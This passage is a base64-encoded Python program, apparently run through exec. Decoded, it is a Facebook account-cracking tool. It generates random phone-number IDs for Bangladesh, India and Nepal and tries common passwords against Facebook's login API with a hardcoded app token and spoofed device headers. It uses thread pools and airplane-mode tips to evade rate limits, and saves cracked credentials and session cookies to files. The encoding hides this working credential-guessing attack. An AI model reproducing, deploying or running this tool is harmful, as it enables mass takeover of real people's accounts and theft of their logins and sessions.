mVwbGFjZSgiKyIsIl8iKS5yZXBsYWNlKCIvIiwiLSIpCiAgICAgICAgICAgICAgICAgICAgY29va2llID0gZiJzYj17c3NiYn07e2Nra2t9IgogICAgICAgICAgICAgICAgICAgIHByaW50KCdcclxyXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bVRveGljXHgxYlsxOzk3bS1ceDFiWzM4OzU7NDZt8J+Smlx4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0gJyt1aWQrJ3wnK3BhcykKICAgICAgICAgICAgICAgICAgICAjbGluZSgpCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAnR0VITEVFLUZJTEUtT0sudHh0JykKICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0dFSExFRS1GSUxFLU9LLUNPT0tJRS1NMy50eHQnLCdhJykud3JpdGUodWlkKyd8JytwYXMrJyA+Pj4gJytjb29raWUrJ1xuJykKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnYScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUodWlkKyd8JytwYXMrJ1xuJykKICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBwb1snZXJyb3InXVsnbWVzc2FnZSddOgogICAgICAgICAgICAgICAgICAgIHVpZCA9IHN0cihwb1snZXJyb3InXVsnZXJyb3JfZGF0YSddWyd1aWQnXSkKICAgICAgICAgICAgICAgICAgICBwcmludChmJ1xyXHJcMzNbMW1cMzNbMTszNW0gW0dFSExFRS1DUF0gJyt1aWQrJyB8ICcrcGFzKydcMDMzWzE7OTdtJykKICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICdHRUhMRUUtRklMRS1DUC50eHQnKQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvR0VITEVFLUNQLnR4dCcsJ2EnKS53cml0ZSh1aWQrJ3wnK3BhcysnXG4nKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdhJykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSh1aWQrJ3wnK3BhcysnXG4nKQogICAgICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIGxvb3ArPTEKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICB0aW1lLnNsZWVwKDIwKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBDT1VOVFJZLUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgY291bnRyeSgpOgogICAgZnJlc2goKTtwcmludChmJyB7bWFpbl94fSAnKTtsaW5lKCkKICAgIGNvbl9jayA9IGlucHV0KGYnIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIHtjfSA6ICcpCiAgICBpZiBjb25fY2sgaW4gWycxJywnMDEnXTpybmRtX2JkKCkKICAgIGVsaWYgY29uX2NrIGluIFsnMicsJzAyJ106cm5kbV9pbmQoKQogICAgZWxpZiBjb25fY2sgaW4gWyczJywnMDMnXTpybmRtX25lcCgpCiAgICBlbHNlOmNvdW50cnkoKQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIFJORE0tQ09ERS1CRCBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmRlZiBybmRtX2JkKCk6CiAgICAgICAgZnJlc2goKTtwcmludChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtRXhhbXBsZVx4MWJbMTs5N23il48gXHgxYlszODs1OzQ2bXtiZF94fSAnKTtsaW5lKCk7Y29kZSA9IGlucHV0KGYnIFx4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bUZpbmQgU2ltIENvZGUgOiAnKQogICAgICAgIGZyZXNoKCk7cHJpbnQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bUV4YW1wbGVceDFiWzE7OTdt4pePIFx4MWJbMzg7NTs0Nm0xMDAwXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm0yMDAwXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm01MDAwICcpO2xpbmUoKTtsaW1pdCA9IGludChpbnB1dChmJ1x4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bUZpbmQgTGltaXQgOiAnKSkKICAgICAgICBmcmVzaCgpO3ByaW50KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXXtjcF94fSAnKTtsaW5lKCk7Y3B5ID0gaW5wdXQoZidceDFiWzM4OzU7MTk2bVx4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIHtjfSBceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtWVx4MWJbMTs5N218XHgxYlszODs1OzQ2bU5ceDFiWzM4OzU7MTk2bV0pIDogJykKICAgICAgICBpZiBjcHkgaW4gWyduJywnTicsJ25vJywnTk8nLCcyJywnMDInXTpjcHguYXBwZW5kKGYnbicpCiAgICAgICAgZWxzZTpjcHguYXBwZW5kKGYneScpCiAgICAgICAgZnJlc2goKTtwcmludChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0ge2Nva2lfeH0gJyk7bGluZSgpO2Nva2l5ID0gaW5wdXQoZicgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0ge2N9IFx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm1ZXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm1OXHgxYlszODs1OzE5Nm1dIDogJykKICAgICAgICBpZiBjb2tpeSBpbiBbJ24nLCdOJywnbm8nLCdOTycsJzInLCcwMiddOmNva2l4LmFwcGVuZChmJ24nKQogICAgICAgIGVsc2U6Y29raXguYXBwZW5kKGYneScpCiAgICAgICAgZm9yIEtpZCBpbiByYW5nZShsaW1pdCk6Qmhvb3R4eCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg4KSk7dXNlci5hcHBlbmQoQmhvb3R4eCkKICAgICAgICB3aXRoIHRyZWQobWF4X3dvcmtlcnM9MzApIGFzIFRhbmltOgogICAgICAgICAgICAgICAgdGwgPSBzdHIobGVuKHVzZXIpKQogICAgICAgICAgICAgICAgZnJlc2goKTtwcmludChmJyBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFNpbSBDb2RlIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0ge2NvZGV9IFxuIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtVG90YWwgTGltaXQgXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm0ge2xpbWl0fSBcbiBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1Vc2UgRmxpZ2h0IE1vZGUgRXZlcnkgNSBNaW51dGVzLi4uJyk7bGluZSgpCiAgICAgICAgICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBjb2RlICsgbG92ZSAKICAgICAgICAgICAgICAgICAgICAgICAgcGFzeCA9IFtsb3ZlLGlkcyxpZHNbOjhdLGlkc1s6N10sJ0BAQCMjIycsJ2FhYmJjYycsJ2FhYWJiYicsJ+Cnp+CnqOCnqeCnquCnq+CnrCcsJ+Cnp+CnqOCnqeCnquCnq+CnrOCnreCnricsJzEwMjAzMCcsJzQwNTA2MCcsJzcwODA5MCddCiAgICAgICAgICAgICAgICAgICAgICAgIFRhbmltLnN1Ym1pdChybmRteCxpZHMscGFzeCx0bCkKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBSTkRNLUNPREUtSU5ESUEgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgcm5kbV9pbmQoKToKICAgICAgICBmcmVzaCgpO3ByaW50KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm1FeGFtcGxlXHgxYlszODs1OzE5Nm1ceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm17aW5kX3h9Jyk7bGluZSgpO2NvZGUgPSBpbnB1dChmJ1x4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bUZpbmQgU2ltIENvZGVceDFiWzE7OTdt4pePICcpCiAgICAgICAgZnJlc2goKTtwcmludChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtRXhhbXBsZVx4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bTEwMDAgfCAyMDAwIHwgNTAwMCAnKTtsaW5lKCk7bGltaXQgPSBpbnQoaW5wdXQoZidceDFiWzM4OzU7MTk2bVx4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bVx4MWJbMzg7NTs0Nm1GaW5kIExpbWl0IDogJykpCiAgICAgICAgZnJlc2goKTtwcmludChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV17Y3BfeH0gJyk7bGluZSgpO2NweSA9IGlucHV0KGYnXHgxYlszODs1OzE5Nm1ceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1ceDFiWzM4OzU7NDZtIHtjfSAoWXxOKSBceDFiWzM4OzU7NDZtICcpCiAgICAgICAgaWYgY3B5IGluIFsnbicsJ04nLCdubycsJ05PJywnMicsJzAyJ106Y3B4LmFwcGVuZChmJ24nKQogICAgICAgIGVsc2U6Y3B4LmFwcGVuZChmJ3knKQogICAgICAgIGZyZXNoKCk7cHJpbnQoZicgIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIHtjb2tpX3h9ICcpO2xpbmUoKTtjb2tpeSA9IGlucHV0KGYnICgrKSB7Y30gKFl8TikgOiAnKQogICAgICAgIGlmIGNva2l5IGluIFsnbicsJ04nLCdubycsJ05PJywnMicsJzAyJ106Y29raXguYXBwZW5kKGYnbicpCiAgICAgICAgZWxzZTpjb2tpeC5hcHBlbmQoZid5JykKICAgICAgICBmb3IgS2lkIGluIHJhbmdlKGxpbWl0KTpCaG9vdHh4ID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDcpKTt1c2VyLmFwcGVuZChCaG9vdHh4KQogICAgICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgVGFuaW06CiAgICAgICAgICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpCiAgICAgICAgICAgICAgICBmcmVzaCgpO3ByaW50KGYnIFx4MWJbMzg7NTs0Nm1TaW0gQ29kZVx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIHtjb2RlfSBcbiAgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0gVG90YWwgTGltaXRceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSB7bGltaXR9IFxuICBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSBVc2UgRmxpZ2h0IE1vZGUgRXZlcnkgNSBNaW51dGVzLi4uJyk7bGluZSgpCiAgICAgICAgICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBjb2RlICsgbG92ZSAKICAgICAgICAgICAgICAgICAgICAgICAgcGFzeCA9IFsnNTc1NzU3NTEnLCc1NzI3MzIwMCcsJzU5MDM5MjAwJyxpZHMsbG92ZSxpZHNbMzpdXQogICAgICAgICAgICAgICAgICAgICAgICBUYW5pbS5zdWJtaXQocm5kbXgsaWRzLHBhc3gsdGwpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgUk5ETS1DT0RFLU5FUEFMIF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIHJuZG1fbmVwKCk6CiAgICAgICAgZnJlc2goKTtwcmludChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUV4YW1wbGUgXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0N20gOTgxNSw5ODE0LDk4NjEsOTg0MCAgJyk7bGluZSgpO2NvZGUgPSBpbnB1dChmJyBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GaW5kIFNpbSBDb2RlIFx4MWJbMTs5N23il48gJykKICAgICAgICBmcmVzaCgpO3ByaW50KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRXhhbXBsZSBceDFiWzE7OTdt4pePXHgxYlszODs1OzQ2bTEwMDAgXHgxYlsxOzk3bXxceDFiWzM4OzU7NDZtIDIwMDBceDFiWzE7OTdtIHwgXHgxYlszODs1OzQ2bTUwMDAgJyk7bGluZSgpO2xpbWl0ID0gaW50KGlucHV0KGYnIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtRmluZCBMaW1pdCA6ICcpKQogICAgICAgIGZyZXNoKCk7cHJpbnQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIHtjcF94fSAnKTtsaW5lKCk7Y3B5ID0gaW5wdXQoZidceDFiWzM4OzU7MTk2bVx4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bVx4MWJbMzg7NTs0Nm0ge2N9IFx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm1ZXHgxYlsxOzk3bXxceDFiWzM4OzU7NDZtTlx4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtICcpCiAgICAgICAgaWYgY3B5IGluIFsnbicsJ04nLCdubycsJ05PJywnMicsJzAyJ106Y3B4LmFwcGVuZChmJ24nKQogICAgICAgIGVsc2U6Y3B4LmFwcGVuZChmJ3knKQogICAgICAgIGZyZXNoKCk7cHJpbnQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSB7Y29raV94fSAnKTtsaW5lKCk7Y29raXkgPSBpbnB1dChmJyAoKykge2N9IChZfE4pIDogJykKICAgICAgICBpZiBjb2tpeSBpbiBbJ24nLCdOJywnbm8nLCdOTycsJzInLCcwMiddOmNva2l4LmFwcGVuZChmJ24nKQogICAgICAgIGVsc2U6Y29raXguYXBwZW5kKGYneScpCiAgICAgICAgZm9yIEtpZCBpbiByYW5nZShsaW1pdCk6Qmhvb3R4eCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg2KSk7dXNlci5hcHBlbmQoQmhvb3R4eCkKICAgICAgICB3aXRoIHRyZWQobWF4X3dvcmtlcnM9MzApIGFzIFRhbmltOgogICAgICAgICAgICAgICAgdGwgPSBzdHIobGVuKHVzZXIpKQogICAgICAgICAgICAgICAgZnJlc2goKTtwcmludChmJyBceDFiWzM4OzU7NDZtU2ltIENvZGVceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSB7Y29kZX1cblx4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bSBUb3RhbCBMaW1pdFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIHtsaW1pdH0gXG4gIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIFVzZSBGbGlnaHQgTW9kZSBFdmVyeSA1IE1pbnV0ZXMuLi4nKTtsaW5lKCkKICAgICAgICAgICAgICAgIGZvciBsb3ZlIGluIHVzZXI6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGNvZGUgKyBsb3ZlIAogICAgICAgICAgICAgICAgICAgICAgICBwYXN4ID0gWyduZXBhbDEyMycsJ25lcGFsMTIzNCcsJ25lcGFsMTIzNicsJ3RhbWFuZzY3JywnbmVwYWwxMjUnLCduZXBhbDEyMzQ1JywnbWF5YTEyMycsJ21heWFAMTIzJywnbWF5YTEyMzEnLCdtYXlhMTIzNDUnLCdwb2toYXJhJywncG9raGFyYTknLCdwb2toYXJhMicsJ3Bva2hhcmEzJywncG9raGFyYTQnLCdwb2toYXJhNScsJ3Bva2hhcmE2JywncG9raGFyYTcnLCdrYXRobWFuZHUnLCd0YW1hbmcnLCd0YW1hbmc0MCcsJ3RhbWFuZzQxJywndGFtYW5nMTIzJywndGFtYW5nMTIzNDUnLCdrYXRobWFuZHUxMjMnLGlkcyxsb3ZlLGlkc1szOl1dCiAgICAgICAgICAgICAgICAgICAgICAgIFRhbmltLnN1Ym1pdChybmRteCxpZHMscGFzeCx0bCkKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBSQU5ET00tTUVUSE9ELUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIyAgICAgIApkZWYgcm5kbXgoaWRzLHBhc3gsdGwpOgogICAgICAgIGdsb2JhbCBsb29wLG9rCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xye3d9IFx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm1UT1hJQ1x4MWJbMTs5N20tXHgxYlszODs1OzE0Nm1YRFx4MWJbMzg7NTsxOTZtXSBbe2xvb3B9XSBbe2xlbihvayl9fHtsZW4oY3ApfV0nKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBmb3IgcGFzIGluIHBhc3g6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjY2Vlc190b2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCiAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVhZGR4ID0gZidbRkJBTi9GQjRBO0ZCQVYvJytzdHIocmFuZG9tLnJhbmRpbnQoMTEsOTkpKSsnLjAuMC4nK3N0cihyYW5kb20ucmFuZGludCgxMTExLDk5OTkpKSsnO0ZCQlYvJytzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KSkrJztbRkJBTi9GQjRBO0ZCQVYvNjEuMC4wLjE1LjY5O0ZCQlYvMjA3NDgxMTg7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTc3Nn07RkJMQy9lc19MQTtGQkNSL1ZJVkE7RkJNRi9Tb255O0ZCQkQvU29ueTtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9DNjkwMjtGQlNWLzUuMS4xO251bGxGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7XScKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHsnYWRpZCc6c3RyKHV1aWQudXVpZDQoKSksJ2Zvcm1hdCc6J2pzb24nLCdkZXZpY2VfaWQnOnN0cih1dWlkLnV1aWQ0KCkpLCdlbWFpbCc6aWRzLCdwYXNzd29yZCc6cGFzLCdnZW5lcmF0ZV9hbmFseXRpY3NfY2xhaW1zJzonMScsJ2NvbW11bml0eV9pZCc6JycsJ2NwbCc6J3RydWUnLCd0cnlfbnVtJzonMScsJ2ZhbWlseV9kZXZpY2VfaWQnOnN0cih1dWlkLnV1aWQ0KCkpLCdjcmVkZW50aWFsc190eXBlJzoncGFzc3dvcmQnLCdzb3VyY2UnOidsb2dpbicsJ2Vycm9yX2RldGFpbF90eXBlJzonYnV0dG9uX3dpdGhfZGlzYWJsZWQnLCdlbnJvbGxfbWlzYXV0aCc6J2ZhbHNlJywnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzonMScsJ2dlbmVyYXRlX21hY2hpbmVfaWQnOicxJywnY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQnOicwJywnbG9jYWxlJzogJ2VuX0dCJywnY2xpZW50X2NvdW50cnlfY29kZSc6ICdHQicsJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6J2F1dGhlbnRpY2F0ZScsJ2FwaV9rZXknOic2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsJ2FjY2Vzc190b2tlbic6YWNjZWVzX3Rva2VufQogICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0geydVc2VyLUFnZW50JzogdWFkZHgsICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsICdDb25uZWN0aW9uJzogJ0tlZXAtQWxpdmUnLCAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsICdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsICdYLUZCLU5ldC1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksICdYLUZCLVNJTS1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksICdBdXRob3JpemF0aW9uJzogJ09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6ICdNT0JJTEUuTFRFJywgJ1gtVGlnb24tSXMtUmV0cnknOiAnRmFsc2UnLCAneC1mYi1zZXNzaW9uLWlkJzogJ25pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLCAneC1mYi1kZXZpY2UtZ3JvdXAnOiAnNTEyMCcsICdYLUZCLUZyaWVuZGx5LU5hbWUnOiAnVmlld2VyUmVhY3Rpb25zTXV0YXRpb24nLCAnWC1GQi1SZXF1ZXN0LUFuYWx5dGljcy1UYWdzJzogJ2dyYXBoc2VydmljZScsICdYLUZCLUhUVFAtRW5naW5lJzogJ0xpZ2VyJywgJ1gtRkItQ2xpZW50LUlQJzogJ1RydWUnLCAnWC1GQi1TZXJ2ZXItQ2x1c3Rlcic6ICdUcnVlJywgJ3gtZmItY29ubmVjdGlvbi10b2tlbic6ICc2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMid9CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luJwogICAgICAgICAgICAgICAgICAgICAgICBwbyA9IHJlcXVlc3RzLnBvc3QodXJsLGRhdGE9ZGF0YSxoZWFkZXJzPWhlYWRlcnMpLmpzb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHBvOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHBvWyd1aWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGtuID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1aWR9L3BpY3R1cmU/dHlwZT1ub3JtYWwnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9IHJlcXVlc3RzLmdldChsa24pLnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ1Bob3Rvc2hvcCcgaW4gcmVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidccntnfSBceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtVE9YSUNceDFiWzE7OTdtLVx4MWJbMzg7NTs0Nm3wn5KaXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSB7c3RyKHVpZCl9IFx4MWJbMTs5N23il48gXHgxYlszODs1OzQ2bXtwYXN9ICcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2tpID0gJzsnLmpvaW4oaVsnbmFtZSddKyc9JytpWyd2YWx1ZSddIGZvciBpIGluIHBvWydzZXNzaW9uX2Nvb2tpZXMnXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd5JyBpbiBjb2tpeDpwcmludChmJ1xye2d9IChLaWQpIDoge2Nva2l9ICcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL1RPWElDLU9LLnR4dCcsJ2EnKS53cml0ZShzdHIodWlkKSsnfCcrcGFzKyd8Jytjb2tpKydcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvay5hcHBlbmQoc3RyKHVpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOmJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OmJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHBvWydlcnJvciddWydtZXNzYWdlJ106IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHBvWydlcnJvciddWydlcnJvcl9kYXRhJ11bJ3VpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3knIGluIGNweDpwcmludChmJ1xye3J9IFtGdWNraW5nXSB7c3RyKHVpZCl9IHwge3Bhc30gJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL1RPWElDLUNQLnR4dCcsJ2EnKS53cml0ZShzdHIodWlkKSsnfCcrcGFzKydcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHN0cih1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6Y29udGludWUKICAgICAgICAgICAgICAgIGxvb3ArPTEKICAgICAgICBleGNlcHQ6cGFzcyAKTWFpbigp'))